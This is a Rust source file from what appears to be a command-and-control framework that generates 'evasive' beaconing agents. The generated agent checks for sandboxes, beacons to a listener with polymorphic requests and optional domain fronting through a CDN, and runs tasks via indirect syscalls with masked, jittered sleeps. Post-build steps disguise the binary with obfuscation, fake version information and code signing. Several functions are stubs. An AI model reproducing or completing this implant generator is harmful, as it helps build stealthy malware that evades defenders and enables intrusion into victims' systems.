// src/agent/generator_helpers.rs - Helper functions for agent generation (~100 lines)
use super::{AgentGenerator, AgentConfig, evasion::EvasionConfig};
use std::fs::File;
use std::io::{Write, Result as IoResult};

impl AgentGenerator {
    // Generate enhanced Cargo.toml with evasion dependencies
    pub(super) fn generate_evasive_cargo_toml(&self) -> String {
        r#"[package]
name = "evasive_agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "evasive_agent"
path = "src/main.rs"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
rand = "0.8"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "winuser", "processthreadsapi", "handleapi", "wincon", "memoryapi", 
    "libloaderapi", "errhandlingapi", "winnt", "winerror"
] }

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
debug = false

[profile.release.package."*"]
opt-level = "z"
"#.to_string()
    }
    
    // Generate main evasive agent source
    pub(super) fn generate_evasive_source(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> String {
        format!(r#"// Auto-generated evasive agent
use std::time::Duration;
use tokio;
use rand::Rng;

mod evasion;
mod syscalls;
mod polymorphic;
mod environment;

use evasion::{{SleepMask, JitterEngine}};
use syscalls::{{SyscallResolver, IndirectSyscall}};
use polymorphic::{{PolymorphicHttp, DomainFronting}};
use environment::EnvironmentChecker;

const LISTENER_URL: &str = "{}";
const SLEEP_TIME: u64 = {};
const JITTER: u8 = {};
const STEALTH_ENABLED: bool = {};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    // Environment checks
    if EnvironmentChecker::is_analysis_environment() {{
        EnvironmentChecker::sandbox_evasion_behavior().await;
        return Ok(());
    }}
    
    // Initialize evasion components
    let mut sleep_mask = SleepMask::new();
    let jitter_engine = JitterEngine::new(Duration::from_secs(SLEEP_TIME), JITTER);
    let mut syscall_resolver = SyscallResolver::new();
    let http_engine = PolymorphicHttp::new();
    
    // Setup domain fronting if enabled
    {}
    
    println!("🔴 Evasive agent starting");
    
    let mut failures = 0;
    const MAX_FAILURES: usize = 5;
    
    loop {{
        // Generate polymorphic request
        let (url, headers) = http_engine.generate_request();
        let full_url = format!("{{}}{{}}", LISTENER_URL, url);
        
        // Perform beacon with evasion
        match perform_evasive_beacon(&full_url, &headers).await {{
            Ok(tasks) => {{
                failures = 0;
                for task in tasks {{
                    execute_task_with_evasion(&task, &mut syscall_resolver).await;
                }}
            }},
            Err(e) => {{
                failures += 1;
                if failures >= MAX_FAILURES {{
                    break;
                }}
            }}
        }}
        
        // Sleep with evasion
        let sleep_duration = jitter_engine.business_hours_sleep();
        {}
    }}
    
    Ok(())
}}

async fn perform_evasive_beacon(url: &str, headers: &std::collections::HashMap<String, String>) -> Result<Vec<String>, Box<dyn std::error::Error>> {{
    // Implement evasive HTTP beacon
    Ok(Vec::new())
}}

async fn execute_task_with_evasion(task: &str, syscall_resolver: &mut SyscallResolver) {{
    // Execute tasks using syscalls and evasion
}}
"#, 
            config.listener_url,
            config.sleep_time,
            config.jitter,
            evasion_config.sleep_mask,
            if evasion_config.domain_fronting {
                r#"let domain_fronting = DomainFronting::new(
        "cdn.cloudflare.com".to_string(),
        LISTENER_URL.to_string()
    );"#
            } else {
                "// Domain fronting disabled"
            },
            if evasion_config.sleep_mask {
                "sleep_mask.mask_and_sleep(sleep_duration);"
            } else {
                "tokio::time::sleep(sleep_duration).await;"
            }
        )
    }
    
    // Create evasion module files
    pub(super) fn create_evasion_modules(&self, project_dir: &str) -> IoResult<()> {
        // Create evasion.rs
        let evasion_content = include_str!("../../../artifacts/agent_evasion_module.rs");
        let mut evasion_file = File::create(format!("{}/src/evasion.rs", project_dir))?;
        evasion_file.write_all(evasion_content.as_bytes())?;
        
        // Create syscalls.rs
        let syscalls_content = include_str!("../../../artifacts/agent_syscalls_module.rs");
        let mut syscalls_file = File::create(format!("{}/src/syscalls.rs", project_dir))?;
        syscalls_file.write_all(syscalls_content.as_bytes())?;
        
        // Create polymorphic.rs
        let polymorphic_content = include_str!("../../../artifacts/agent_polymorphic_module.rs");
        let mut polymorphic_file = File::create(format!("{}/src/polymorphic.rs", project_dir))?;
        polymorphic_file.write_all(polymorphic_content.as_bytes())?;
        
        // Create environment.rs
        let environment_content = include_str!("../../../artifacts/agent_environment_module.rs");
        let mut environment_file = File::create(format!("{}/src/environment.rs", project_dir))?;
        environment_file.write_all(environment_content.as_bytes())?;
        
        Ok(())
    }
    
    // Post-build evasion techniques
    pub(super) fn apply_post_build_evasion(&self, config: &AgentConfig) -> IoResult<()> {
        if !std::path::Path::new(&config.output_path).exists() {
            return Ok(());
        }
        
        // Apply binary obfuscation
        self.obfuscate_binary(&config.output_path)?;
        
        // Add version information to appear legitimate
        self.add_version_info(&config.output_path)?;
        
        // Sign with certificate if available
        self.apply_code_signing(&config.output_path)?;
        
        Ok(())
    }
    
    fn obfuscate_binary(&self, binary_path: &str) -> IoResult<()> {
        println!("🔧 Applying binary obfuscation to {}", binary_path);
        // Implementation would apply UPX packing, section manipulation, etc.
        Ok(())
    }
    
    fn add_version_info(&self, binary_path: &str) -> IoResult<()> {
        println!("📋 Adding legitimate version info to {}", binary_path);
        // Implementation would add Windows version resources
        Ok(())
    }
    
    fn apply_code_signing(&self, binary_path: &str) -> IoResult<()> {
        println!("🔏 Attempting code signing for {}", binary_path);
        // Implementation would sign with available certificates
        Ok(())
    }
    
    // Standard agent generation (existing functionality preserved)
    pub(super) fn generate_standard_agent(&self, config: AgentConfig) -> IoResult<()> {
        println!("📦 Generating standard agent without evasion features...");
        
        // Create basic project structure
        let temp_dir = "/tmp/standard_agent";
        std::fs::create_dir_all(format!("{}/src", temp_dir))?;
        
        // Basic Cargo.toml
        let basic_cargo = r#"[package]
name = "agent"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json"] }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
"#;
        
        let mut cargo_file = File::create(format!("{}/Cargo.toml", temp_dir))?;
        cargo_file.write_all(basic_cargo.as_bytes())?;
        
        // Basic agent source
        let basic_source = format!(r#"// Basic agent without evasion
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    println!("Basic agent starting");
    
    loop {{
        // Basic beacon logic
        tokio::time::sleep(Duration::from_secs({})).await;
    }}
}}
"#, config.sleep_time);
        
        let mut main_file = File::create(format!("{}/src/main.rs", temp_dir))?;
        main_file.write_all(basic_source.as_bytes())?;
        
        println!("📦 Basic agent project created at {}", temp_dir);
        Ok(())
    }
}